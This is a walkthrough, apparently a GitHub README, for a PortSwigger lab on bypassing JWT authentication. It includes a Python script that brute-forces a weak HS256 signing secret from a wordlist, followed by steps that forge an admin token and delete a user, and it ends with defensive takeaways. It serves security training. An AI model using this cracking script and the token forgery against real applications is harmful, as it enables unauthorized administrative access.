#  JWT authentication bypass via weak signing key

## 📌 Lab Details
- **Title**: Weak Signing Key
- **Difficulty**: Practitioner
- **Category**: Json Web Token
- **Lab URL**: https://portswigger.net/academy/labs/launch/e9c7b6167992b3c62991a0f0b30c4b0f6e050a62099eea7092823b12da8356b0?referrer=%2fweb-security%2fjwt%2flab-jwt-authentication-bypass-via-weak-signing-key

## 🔍 Summary
This lab demonstrates a vulnerability where the JWT is signed using a weak secret key. Since the application uses a symmetric algorithm (HS256), the same secret is used for both signing and verification. By brute-forcing the secret key using a wordlist, an attacker can forge a valid JWT with elevated privileges and gain access to the admin panel.

## 🛠 Steps to Solve
1. Login using the given credentials.
2. Observe the **JWT** in session cookie.
3. **Analyze Token**
   - Decode JWT
   - Algorithm - `HS256`
4. **Brute-force Secret (Python)**
   ```py
   import jwt

   token = "PASTE_JWT_HERE"
   wordlist = "secrets.txt"

   with open(wordlist, "r") as f:
      for key in f:
          key = key.strip()
          try:
              jwt.decode(token, key, algorithms=["HS256"])
              print(f"[+] Secret found: {key}")
              break
          except jwt.exceptions.InvalidSignatureError:
              continue
          except Exception:
              continue
   ```
5. Run the script to find the secret key.
6. Open the **JWT editor** and create a signature using the obtained key.
7. Switch to the **JSON Web Token** tab to create a new JWT for the new signature.
8. **Access Admin Panel**: `/admin`.
9. Find the endpoint and delete the user to complete the lab.

## 📖 Key Takeaways
- JWT with **weak secrets can be brute-forced online**.
- HS256 uses a **shared secret ->** high risk if weak.
- Signature verification can be repeated locally.
- Always use:
  - Strong secrets.
  - Asymmetric algorithms (RS256) where possible.

## 🖼️ Screenshot 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/37f1a3ce-438a-43b7-8a68-00fdf56e0012" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/77d0cf43-70a6-486e-8db0-3b6cd7938b59" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/200f4f98-d585-4eda-981d-419ea0e074b9" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/67b81498-ee96-4782-8d1e-2285d71bf2ca" />
